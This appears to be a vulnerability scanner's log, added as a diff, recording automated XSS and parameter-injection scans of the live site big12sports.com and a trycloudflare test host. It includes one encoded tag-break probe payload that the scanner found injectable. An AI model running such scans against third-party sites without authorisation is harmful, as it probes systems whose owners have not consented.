+2026-03-23 15:03:03,042 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 15:04:13,477 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 15:04:13,478 - VulnerabilityScanner - INFO - 🔗 Testing 8 discovered URLs for parameter injection...
+2026-03-23 15:04:22,263 - VulnerabilityScanner - INFO - ✅ Discovered URLs XSS testing complete
+2026-03-23 15:04:22,264 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-23 15:04:22,264 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-23 15:05:05,303 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-23 15:05:05,304 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-23 15:22:17,685 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 15:22:17,686 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 15:22:17,686 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 15:22:17,686 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 15:22:17,686 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 15:30:10,954 - VulnerabilityScanner - INFO - ✅ Playwright discovered 13 parameters
+2026-03-23 15:30:11,000 - VulnerabilityScanner - INFO - 🔍 [GAU+KATANA] Running URL enumeration with gau piped to katana...
+2026-03-23 15:31:41,080 - VulnerabilityScanner - INFO -    ⚠️  Gau→Katana found no URLs
+2026-03-23 15:31:41,128 - VulnerabilityScanner - INFO - 🔍 [WAYBACKURLS+KATANA] Running URL enumeration with waybackurls piped to katana...
+2026-03-23 15:33:11,214 - VulnerabilityScanner - INFO -    ⚠️  Waybackurls→Katana found no URLs
+2026-03-23 15:33:11,255 - VulnerabilityScanner - INFO - 🔍 [KATANA-DIRECT] Running URL crawling with katana directly on target...
+2026-03-23 15:33:33,959 - VulnerabilityScanner - INFO -    ✅ Katana-Direct found 2 URLs with 0 new parameters
+2026-03-23 15:33:33,968 - VulnerabilityScanner - INFO - ✅ Discovered 13 unique parameters: sidearm-calendar-select-school, __VIEWSTATEGENERATOR, sidearm-calendar-select-sport, target, __VIEWSTATE, videosSelect, sidearm-calendar-chooser-end-date, path, sidearm-calendar-chooser-start-date, searchInput
+2026-03-23 15:33:33,968 - VulnerabilityScanner - INFO - ✅ Discovered 10 URLs with parameters
+2026-03-23 15:33:33,968 - VulnerabilityScanner - INFO - ✓ Discovered 13 parameters from domain, testing 42 total with common defaults
+2026-03-23 15:33:33,968 - VulnerabilityScanner - INFO - 🔗 Also testing 10 discovered URLs for XSS injection...
+2026-03-23 15:33:33,968 - VulnerabilityScanner - INFO - Testing 42 parameter(s)
+2026-03-23 15:33:33,969 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 15:33:33,969 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 15:34:45,757 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 15:34:45,757 - VulnerabilityScanner - INFO - 🔗 Testing 10 discovered URLs for parameter injection...
+2026-03-23 15:34:54,589 - VulnerabilityScanner - INFO - ✅ Discovered URLs XSS testing complete
+2026-03-23 15:34:54,589 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-23 15:34:54,590 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-23 15:35:36,448 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-23 15:35:36,449 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-23 15:39:24,051 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 15:39:24,051 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 15:39:24,051 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 15:39:24,051 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 15:39:24,051 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 15:39:24,102 - VulnerabilityScanner - INFO - 🔍 [GAU+KATANA] Running URL enumeration with gau piped to katana...
+2026-03-23 15:40:54,167 - VulnerabilityScanner - INFO -    ⚠️  Gau→Katana found no URLs
+2026-03-23 15:40:54,222 - VulnerabilityScanner - INFO - 🔍 [WAYBACKURLS+KATANA] Running URL enumeration with waybackurls piped to katana...
+2026-03-23 15:48:31,839 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 15:48:31,839 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 15:48:31,839 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 15:48:31,839 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 15:48:31,839 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 15:48:31,884 - VulnerabilityScanner - INFO - 🔍 [GAU+KATANA] Running URL enumeration with gau piped to katana...
+2026-03-23 15:56:59,032 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 16:01:44,669 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 16:19:57,342 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 16:41:17,682 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 16:43:48,841 - VulnerabilityScanner - WARNING - ⚠️  No parameters discovered, using common defaults
+2026-03-23 16:48:09,726 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 17:07:03,652 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 17:08:24,527 - VulnerabilityScanner - WARNING - ⚠️  No parameters discovered, using common defaults
+2026-03-23 17:25:49,574 - VulnerabilityScanner - INFO - Scanner initialized for: https://average-administrators-especially-intervention.trycloudflare.com/?x=bleh
+2026-03-23 17:25:49,574 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 17:25:49,574 - VulnerabilityScanner - INFO - Testing 30 parameter(s)
+2026-03-23 17:25:49,574 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 17:25:49,574 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 17:25:50,375 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: x (tag_break)
+2026-03-23 17:25:50,376 - VulnerabilityScanner - INFO -     URL: https://average-administrators-especially-intervention.trycloudflare.com/?x=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 17:26:01,994 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 17:26:01,994 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-23 17:26:01,994 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-23 17:26:14,679 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-23 17:26:14,680 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-23 19:32:54,343 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 19:32:54,344 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 19:33:36,879 - VulnerabilityScanner - INFO -    ✅ Gau→Katana found 1 URLs with 0 new parameters
+2026-03-23 19:33:49,047 - VulnerabilityScanner - INFO -    ✅ Waybackurls→Katana found 2 historical URLs with 0 new parameters
+2026-03-23 19:34:00,699 - VulnerabilityScanner - INFO -    ✅ Katana-Direct found 1 URLs with 0 new parameters
+2026-03-23 19:34:03,300 - VulnerabilityScanner - INFO - ✅ Discovered 4 URLs with parameters
+2026-03-23 19:34:03,302 - VulnerabilityScanner - WARNING - ⚠️  No parameters discovered, using common defaults
+2026-03-23 19:34:03,303 - VulnerabilityScanner - INFO - Testing 29 parameter(s)
+2026-03-23 19:34:03,304 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 19:34:09,429 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 19:34:09,430 - VulnerabilityScanner - INFO - 🔗 Testing 4 discovered URLs for parameter injection...
+2026-03-23 19:34:09,430 - VulnerabilityScanner - INFO - ✅ Discovered URLs XSS testing complete
+2026-03-23 19:34:20,181 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-23 19:34:20,181 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-23 19:34:20,719 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 19:34:20,719 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 19:42:54,150 - VulnerabilityScanner - WARNING - ⚠️  No parameters discovered, using common defaults
